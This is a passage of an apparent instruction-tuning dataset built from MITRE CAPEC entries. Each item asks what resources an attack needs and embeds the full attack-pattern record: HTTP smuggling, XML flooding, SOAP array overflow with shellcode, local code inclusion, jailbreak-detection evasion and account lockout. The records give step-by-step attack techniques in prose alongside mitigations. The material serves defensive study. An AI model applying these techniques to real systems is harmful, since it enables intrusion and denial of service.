              "xhtml:p": "Apache server 2.0.45 and version before 1.3.34, when used as a proxy, easily lead to web cache poisoning and bypassing of application firewall restrictions because of non-standard HTTP behavior. Although the HTTP/1.1 specification clearly states that a request with both \"Content-Length\" and a \"Transfer-Encoding: chunked\" headers is invalid, vulnerable versions of Apache accept such requests and reassemble the ones with \"Transfer-Encoding: chunked\" header without replacing the existing \"Content-Length\" header or adding its own. This leads to HTTP Request Smuggling using a request with a chunked body and a header with \"Content-Length: 0\". See also: CVE-2005-2088"
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "444"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "26",
            "Entry_Name": "HTTP Request Smuggling"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-38"
            },
            {
              "@External_Reference_ID": "REF-117"
            },
            {
              "@External_Reference_ID": "REF-617"
            },
            {
              "@External_Reference_ID": "REF-672"
            },
            {
              "@External_Reference_ID": "REF-673"
            },
            {
              "@External_Reference_ID": "REF-674"
            },
            {
              "@External_Reference_ID": "REF-678"
            },
            {
              "@External_Reference_ID": "REF-681"
            },
            {
              "@External_Reference_ID": "REF-682"
            },
            {
              "@External_Reference_ID": "REF-683"
            },
            {
              "@External_Reference_ID": "REF-684"
            }
          ]
        },
        "Notes": {
          "Note": [
            {
              "@Type": "Terminology",
              "#text": "HTTP Splitting \u2013 \"the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender\u2019s intension. The messages sent are 100% valid and RFC compliant\" [REF-117]."
            },
            {
              "@Type": "Terminology",
              "#text": "HTTP Smuggling \u2013 \"the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender\u2019s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way\" [REF-117]."
            },
            {
              "@Type": "Relationship",
              "#text": "HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against."
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Related_Attack_Patterns, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated @Status, Alternate_Terms, Consequences, Description, Example_Instances, Execution_Flow, Extended_Description, Indicators, Mitigations, Notes, Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Alternate_Terms, Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: XML Ping of the Death (CAPEC ID: 147)",
    "context": "",
    "output": "The resources required to execute XML Ping of the Death (CAPEC ID: 147) are the following: Transaction generator(s)/source(s) and ability to cause arrival of messages at the target with sufficient rapidity to overload target. Larger targets may be able to handle large volumes of requests so the attacker may require significant resources (such as a distributed network) to affect the target. However, the resources required of the attacker would be less than in the case of a simple flooding attack against the same target.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Transaction generator(s)/source(s) and ability to cause arrival of messages at the target with sufficient rapidity to overload target. Larger targets may be able to handle large volumes of requests so the attacker may require significant resources (such as a distributed network) to affect the target. However, the resources required of the attacker would be less than in the case of a simple flooding attack against the same target.",
      "@Name": "XML Ping of the Death (CAPEC ID: 147)",
      "attack_ptrn": {
        "@ID": "147",
        "@Name": "XML Ping of the Death",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target. Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "528"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.",
              "Technique": [
                "Use an automated tool to record all instances of URLs to process XML requests.",
                "Use a browser to manually explore the website and analyze how the application processes XML requests."
              ]
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Launch a resource depletion attack] The attacker delivers a large number of small XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.",
              "Technique": "Send a large number of crafted small XML messages to the target URL."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target must receive and process XML transactions."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To send small XML messages"
            },
            {
              "@Level": "High",
              "#text": "To use distributed network to launch the attack"
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Transaction generator(s)/source(s) and ability to cause arrival of messages at the target with sufficient rapidity to overload target. Larger targets may be able to handle large volumes of requests so the attacker may require significant resources (such as a distributed network) to affect the target. However, the resources required of the attacker would be less than in the case of a simple flooding attack against the same target."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": "Resource Consumption",
            "Note": "DoS: resource consumption (other)"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.",
            "Implementation: Provide for network flow control and traffic shaping to control access to the resources."
          ]
        },
        "Example_Instances": {
          "Example": "Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "400"
            },
            {
              "@CWE_ID": "770"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2018-07-31",
            "Modification_Comment": "Updated Solutions_and_Mitigations"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Timestamp Request (CAPEC ID: 295)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Timestamp Request (CAPEC ID: 295):\nScanners or utilities that provide the ability to send custom ICMP queries.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Scanners or utilities that provide the ability to send custom ICMP queries.",
      "@Name": "Timestamp Request (CAPEC ID: 295)",
      "attack_ptrn": {
        "@ID": "295",
        "@Name": "Timestamp Request",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "This pattern of attack leverages standard requests to learn the exact time associated with a target system. An adversary may be able to use the timestamp returned from the target to attack time-based security algorithms, such as random number generators, or time-based authentication mechanisms.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "292",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to send a timestamp request to a remote target and receive a response."
        },
        "Resources_Required": {
          "Resource": "Scanners or utilities that provide the ability to send custom ICMP queries."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Other"
          }
        },
        "Example_Instances": {
          "Example": [
            "An adversary sends an ICMP type 13 Timestamp Request to determine the time as recorded by a remote target. Timestamp Replies, ICMP Type 14, usually return a value in Greenwich Mean Time. An adversary can attempt to use an ICMP Timestamp requests to 'ping' a remote system to see if is alive. Additionally, because these types of messages are rare they are easily spotted by intrusion detection systems, many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 13 and egress ICMP type 14 messages.",
            "An adversary may gather the system time or time zone from a local or remote system. This information may be gathered in a number of ways, such as with Net on Windows by performing net time \\\\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. The information could be useful for performing other techniques, such as executing a file with a Scheduled Task, or to discover locality information based on time zone to assist in victim targeting"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1124",
            "Entry_Name": "System Time Discovery"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pp. 44-51"
            },
            {
              "@External_Reference_ID": "REF-123"
            },
            {
              "@External_Reference_ID": "REF-124"
            },
            {
              "@External_Reference_ID": "REF-125"
            },
            {
              "@External_Reference_ID": "REF-147",
              "@Section": "Section 3.7.2 ICMP Probe Selection, pg. 70"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Description Summary, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2018-07-31",
            "#text": "ICMP Timestamp Request"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: SOAP Array Overflow (CAPEC ID: 256)",
    "context": "",
    "output": "required resources:\nThe attacker must be able to craft malformed SOAP messages, specifically, messages with arrays where the stated array size understates the actual size of the array in the message.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must be able to craft malformed SOAP messages, specifically, messages with arrays where the stated array size understates the actual size of the array in the message.",
      "@Name": "SOAP Array Overflow (CAPEC ID: 256)",
      "attack_ptrn": {
        "@ID": "256",
        "@Name": "SOAP Array Overflow",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array.",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "100"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target application] The adversary identifies a target application to perform the buffer overflow on. In this attack, adversaries look for applications that utilize SOAP as a communication mechanism."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.",
              "Technique": "The adversary creates a SOAP message that incorrectly specifies the size of its array to be smaller than the size of the actual content by a large margin and sends it to the application. If this causes a crash or some unintended behavior, it is likely that this is a valid injection vector."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.",
              "Technique": [
                "Create malicious shellcode that will execute when the program execution is returned to it.",
                "Use a NOP-sled in the overflow content to more easily \"slide\" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs",
                "The adversary will choose a SOAP type that allows them to put shellcode into the buffer when the array is read into the application."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Overflow the buffer] Using the injection vector, the adversary sends the crafted SOAP message to the program, overflowing the buffer."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The targeted SOAP server must trust that the array size as stated in messages it receives is correct, but read through the entire content of the message regardless of the stated size of the array."
        },
        "Resources_Required": {
          "Resource": "The attacker must be able to craft malformed SOAP messages, specifically, messages with arrays where the stated array size understates the actual size of the array in the message."
        },
        "Mitigations": {
          "Mitigation": "If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "805"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "35",
            "Entry_Name": "SOAP Array Abuse"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-102"
            },
            {
              "@External_Reference_ID": "REF-103",
              "@Section": "5.4.2 Arrays"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Local Code Inclusion (CAPEC ID: 251)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Local Code Inclusion (CAPEC ID: 251):\nThe adversary needs to have enough access to the target application to control the identity of a locally included file. The attacker may also need to be able to upload arbitrary code files to the target machine, although any location for these files may be acceptable.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary needs to have enough access to the target application to control the identity of a locally included file. The attacker may also need to be able to upload arbitrary code files to the target machine, although any location for these files may be acceptable.",
      "@Name": "Local Code Inclusion (CAPEC ID: 251)",
      "attack_ptrn": {
        "@ID": "251",
        "@Name": "Local Code Inclusion",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "175"
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture.",
            "Some variants of this attack may require that old versions of some code files be present and in predictable locations."
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary needs to have enough access to the target application to control the identity of a locally included file. The attacker may also need to be able to upload arbitrary code files to the target machine, although any location for these files may be acceptable."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Through local code inclusion, the adversary compromises the integrity of the application."
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data",
              "Note": "An attacker may leverage local code inclusion in order to print sensitive data to a page, such as hidden configuration files or or password hashes."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Implementation: Avoid passing user input to filesystem or framework API. If necessary to do so, implement a specific, allowlist approach."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "829"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1055",
            "Entry_Name": "Process Injection"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-613",
            "@Section": "Testing for Local File Inclusion"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Root/Jailbreak Detection Evasion via Debugging (CAPEC ID: 661)",
    "context": "",
    "output": "required resources:\nThe adversary must have a Rooted/Jailbroken mobile device with debugging capabilities.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must have a Rooted/Jailbroken mobile device with debugging capabilities.",
      "@Name": "Root/Jailbreak Detection Evasion via Debugging (CAPEC ID: 661)",
      "attack_ptrn": {
        "@ID": "661",
        "@Name": "Root/Jailbreak Detection Evasion via Debugging",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary inserts a debugger into the program entry point of a mobile application to modify the application binary, with the goal of evading Root/Jailbreak detection. Mobile device users often Root/Jailbreak their devices in order to gain administrative control over the mobile operating system and/or to install third-party mobile applications that are not provided by authorized application stores (e.g. Google Play Store and Apple App Store). Rooting/Jailbreaking a mobile device also provides users with access to system debuggers and disassemblers, which can be leveraged to exploit applications by dumping the application's memory at runtime in order to remove or bypass signature verification methods. This further allows the adversary to evade Root/Jailbreak detection mechanisms, which can result in execution of administrative commands, obtaining confidential data, impersonating legitimate users of the application, and more.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "121"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "68"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "660"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify application with attack potential] The adversary searches for and identifies a mobile application that could be exploited for malicious purposes (e.g. banking, voting, or medical applications).",
              "Technique": "Search application stores for mobile applications worth exploiting"
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Debug the target application] The adversary inserts the debugger into the program entry point of the mobile application, after the application's signature has been identified, to dump its memory contents.",
              "Technique": [
                "Insert the debugger at the mobile application's program entry point, after the application's signature has been identified.",
                "Dump the memory region containing the now decrypted code from the address space of the binary."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Remove application signature verification methods] Remove signature verification methods from the decrypted code and resign the application with a self-signed certificate."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Execute the application and evade Root/Jailbreak detection methods] The application executes with the self-signed certificate, while believing it contains a trusted certificate. This now allows the adversary to evade Root/Jailbreak detection via code hooking or other methods.",
              "Technique": "Optional: Hook code into the target application."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "A debugger must be able to be inserted into the targeted application."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Knowledge about Root/Jailbreak detection and evasion techniques."
            },
            {
              "@Level": "Medium",
              "#text": "Knowledge about runtime debugging."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary must have a Rooted/Jailbroken mobile device with debugging capabilities."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Integrity",
                "Authorization"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Through Root/Jailbreak Detection Evasion via Debugging, the adversary compromises the integrity of the application."
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control"
              ],
              "Impact": "Read Data",
              "Note": "An adversary may leverage Root/Jailbreak Detection Evasion via Debugging in order to obtain sensitive information."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Instantiate checks within the application code that ensures debuggers are not attached."
        },
        "Example_Instances": {
          "Example": "An adversary targets an iOS banking application in an attempt to compromise sensitive user data. The adversary launches the application with the iOS debugger and sets a breakpoint at the program entry point, after the application's signature has been verified. Next, the adversary dumps the memory region that contains the decrypted code from the address space of the binary. The 'Restrict' flag is then stripped from the application and the adversary resigns the application with a self-signed certificate. The application is now executed without the 'Restrict' flag, while trusting the self-signed certificate to be legitimate. However, the adversary is now able to evaded Jailbreak detection via code hooking or other methods and can glean user credentials and/or transaction details."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "489"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-625"
            },
            {
              "@External_Reference_ID": "REF-626"
            },
            {
              "@External_Reference_ID": "REF-627"
            },
            {
              "@External_Reference_ID": "REF-628"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-12-17"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: White Box Reverse Engineering (CAPEC ID: 167)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern White Box Reverse Engineering (CAPEC ID: 167):\nReverse engineering of software requires varying tools and methods that enable the decompiling of executable or other compiled objects.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Reverse engineering of software requires varying tools and methods that enable the decompiling of executable or other compiled objects.",
      "@Name": "White Box Reverse Engineering (CAPEC ID: 167)",
      "attack_ptrn": {
        "@ID": "167",
        "@Name": "White Box Reverse Engineering",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker discovers the structure, function, and composition of a type of computer software through white box analysis techniques. White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "188"
          }
        },
        "Prerequisites": {
          "Prerequisite": "Direct access to the object or software."
        },
        "Resources_Required": {
          "Resource": "Reverse engineering of software requires varying tools and methods that enable the decompiling of executable or other compiled objects."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1323"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Activation_Zone, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Lifting Sensitive Data from the Client"
          }
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Inducing Account Lockout (CAPEC ID: 2)",
    "context": "",
    "output": "The resources required to execute Inducing Account Lockout (CAPEC ID: 2) are the following: Computer with access to the login portion of the target system",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Computer with access to the login portion of the target system",
      "@Name": "Inducing Account Lockout (CAPEC ID: 2)",
      "attack_ptrn": {
        "@ID": "2",
        "@Name": "Inducing Account Lockout",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker leverages the security functionality of the system aimed at thwarting potential attacks to launch a denial of service attack against a legitimate system user. Many systems, for instance, implement a password throttling mechanism that locks an account after a certain number of incorrect log in attempts. An attacker can leverage this throttling mechanism to lock a legitimate user out of their own account. The weakness that is being leveraged by an attacker is the very security feature that has been put in place to counteract attacks.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "212",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "[Investigate account lockout behavior of system] Investigate the security features present in the system that may trigger an account lockout",
              "Technique": [
                "Analyze system documentation to find list of events that could potentially cause account lockout",
                "Obtain user account in system and attempt to lock it out by sending malformed or incorrect data repeatedly",
                "Determine another user's login ID, and attempt to brute force the password (or other credentials) for it a predetermined number of times, or until the system provides an indication that the account is locked out."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Obtain list of user accounts to lock out] Generate a list of valid user accounts to lock out",
              "Technique": [
                "Obtain list of authorized users using another attack pattern, such as SQL Injection.",
                "Attempt to create accounts if possible; system should indicate if a user ID is already taken.",
                "Attempt to brute force user IDs if system reveals whether a given user ID is valid or not upon failed login attempts."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Lock Out Accounts] Perform lockout procedure for all accounts that the attacker wants to lock out.",
              "Technique": "For each user ID to be locked out, perform the lockout procedure discovered in the first step."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system has a lockout mechanism.",
            "An attacker must be able to reproduce behavior that would result in an account being locked."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "No programming skills or computer knowledge is needed. An attacker can easily use this attack pattern following the Execution Flow above."
          }
        },
        "Resources_Required": {
          "Resource": "Computer with access to the login portion of the target system"
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": "Resource Consumption",
            "Note": "Denial of Service"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Implement intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name.",
            "When implementing security features, consider how they can be misused and made to turn on themselves."
          ]
        },
        "Example_Instances": {
          "Example": "A famous example of this type an attack is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "645"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
